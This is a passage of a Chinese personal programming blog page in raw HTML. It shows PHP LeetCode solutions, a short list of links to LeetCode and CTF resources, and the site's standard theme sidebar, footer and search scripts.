class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ($x &gt; $reverse) &#123;</span><br><span class="line">            $reverse = (int)($reverse * <span class="number">10</span> + $x % <span class="number">10</span>);</span><br><span class="line">            $x = (int)($x / <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $x === $reverse || $x === (int)($reverse / <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Remove-Linked-List-Elements"><a href="#Remove-Linked-List-Elements" class="headerlink" title="Remove Linked List Elements"></a>Remove Linked List Elements</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param ListNode $head</span></span><br><span class="line"><span class="comment">     * @param Integer $val</span></span><br><span class="line"><span class="comment">     * @return ListNode</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">removeElements</span>(<span class="params">$head, $val</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!$head)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data=$head;</span><br><span class="line">        <span class="keyword">while</span>($data-&gt;next)&#123;</span><br><span class="line">            <span class="keyword">if</span>($data-&gt;next-&gt;val==$val)&#123;</span><br><span class="line">                $data-&gt;next=$data-&gt;next-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $data=$data-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $head-&gt;val==$val?$head-&gt;next:$head;      </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://lbjheiheihei.xyz/2018/08/23/CTF-2.html" target="_blank" rel="noopener">CTF 相关的内容</a></p>
<p><a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">ctf 挑战</a></p>
<p><a href="http://cs-cjl.com/2016/06_23_leetcode_1_two_sum" target="_blank" rel="noopener">LeetCode 算法题 1. Two Sum</a></p>
<p><a href="https://laravelacademy.org/post/19641.html" target="_blank" rel="noopener">Leetcode基础刷题之PHP解析(112. Path Sum)</a></p>
<p><a href="https://learnku.com/articles/25478" target="_blank" rel="noopener">尝试 Leetcode https://github.com/icecho/leetcode</a></p>
<p><a href="https://laravelacademy.org/tags/leetcode" target="_blank" rel="noopener">Leetcode之PHP版题目解析</a></p>
<p><a href="https://leetcode-cn.com/" target="_blank" rel="noopener">leetcode中国</a></p>
<p><a href="https://github.com/haoel/haoel.github.io" target="_blank" rel="noopener">科学上网</a></p>
<p><a href="https://learnku.com/articles/25461#topnav" target="_blank" rel="noopener">挑战用 PHP 在 LeetCode 刷算法题</a></p>
<p><a href="http://blessjing.cn/index.php/2019/03/31/arts-%E6%8C%91%E6%88%98%EF%BC%88%E7%AC%AC%E4%BA%8C%E5%91%A8%EF%BC%89/" target="_blank" rel="noopener">ARTS 挑战</a></p>
<p><a href="https://github.com/haoel/leetcode" target="_blank" rel="noopener">LEETCODE 编程训练</a></p>
<p><a href="https://github.com/wuqinqiang/leetcode-php" target="_blank" rel="noopener">PHP 开始 leetcode 刷题时光</a></p>
<p><a href="https://learnku.com/articles/29219" target="_blank" rel="noopener">Leetcode 二叉树题目集合</a></p>
<p><a href="https://github.com/8090Lambert/Leetcode-Example" target="_blank" rel="noopener">Leetcode 全套题解</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">苏生不惑</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">151</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">36</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/sushengbuhuo" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mysusheng@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://plus.google.com/mysusheng" target="_blank" title="Google">
                      
                        <i class="fa fa-fw fa-google"></i>Google</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://v2ex.com/" title="v2ex" target="_blank">v2ex</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.fanhaobai.com/" title="fanhaobai" target="_blank">fanhaobai</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://yuanxuxu.com/archives/" title="yuanxuxu" target="_blank">yuanxuxu</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.snail-c.cn/article" title="snail-c" target="_blank">snail-c</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://showcj.com/archives" title="showcj" target="_blank">showcj</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://vultr.aicnm.com/%E6%9C%80%E6%96%B0Vultr%E6%B3%A8%E5%86%8C%E5%8F%8AVPS%E8%B4%AD%E4%B9%B0%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B/" title="vultr" target="_blank">vultr</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lucissfer.com/" title="lucissfer" target="_blank">lucissfer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.csdn.net/fdipzone/article/details/79352685" title="傲雪星枫" target="_blank">傲雪星枫</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.yoby123.cn/index.php/category/default/" title="小白的分享" target="_blank">小白的分享</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/52fhy/p/5819995.html" title="PHP攻城狮" target="_blank">PHP攻城狮</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.jiaojie.site/" title="php" target="_blank">php</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sphard.com/archives/" title="sphard" target="_blank">sphard</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://yuanxuxu.com/archives/" title="LNMP技术栈笔记" target="_blank">LNMP技术栈笔记</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.coding10.com/" title="学习 Laravel" target="_blank">学习 Laravel</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://shuwoom.com/?page_id=929" title="区块链学习指南" target="_blank">区块链学习指南</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://greenlightt.github.io/archives/" title="greenlightt" target="_blank">greenlightt</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.0php.net/archives/" title="0php" target="_blank">0php</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.fordba.com/category/mysql" title="mysql" target="_blank">mysql</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.itcodemonkey.com/" title="程序员" target="_blank">程序员</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.yanshuo.me/r/v2ex" title="言说" target="_blank">言说</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.timiguo.com/archive.html" title="提米果的博客" target="_blank">提米果的博客</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://phpartisan.cn/news/112.html" title="phpartisan" target="_blank">phpartisan</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/52fhy/" title="飞鸿影" target="_blank">飞鸿影</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.54php.cn/" title="54php" target="_blank">54php</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lazyman.vip/" title="营销" target="_blank">营销</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.njphper.com/archives/" title="做人呢最重要的就是开心" target="_blank">做人呢最重要的就是开心</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.h57.pw/" title="php 初心者" target="_blank">php 初心者</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">苏生不惑</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>



<div>
<span id="showDays"></span>

</div>

<span id="busuanzi_container_site_pv">
   总访问量:<span id="busuanzi_value_site_pv"></span>次
</span>



  <span class="post-meta-divider">|</span>



<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共503.4k字</span>
</div>
<script>
var birthDay = new Date("11/20/2018");
var now = new Date();
var duration = now.getTime() - birthDay.getTime();
var total= Math.floor(duration / (1000 * 60 * 60 * 24));
document.getElementById("showDays").innerHTML = "本站已运行 "+total+" 天";
</script>

        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人次
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  











<script type="text/javascript">
    (function() {
        // 匿名函数，防止污染全局变量
        var utterances = document.createElement('script');
        utterances.type = 'text/javascript';
        utterances.async = true;
        utterances.setAttribute('issue-term','0')
        utterances.setAttribute('theme','')
        utterances.setAttribute('repo','sushengbuhuo/laravel_ioc_demo')
        utterances.crossorigin = 'anonymous';
        utterances.src = 'https://utteranc.es/client.js';
        // content 是要插入评论的地方
        document.getElementById('gitment-container').appendChild(utterances);
    })();
</script>


  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

  
<script>
  ((window.gitter = {}).chat = {}).options = {
    //room替换成自己的聊天室名称即可，room的名称规则是：username/roomname
    room: 'sushengbuhuo-chat/mychat'
  };
</script>
<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>

</body>
</html>
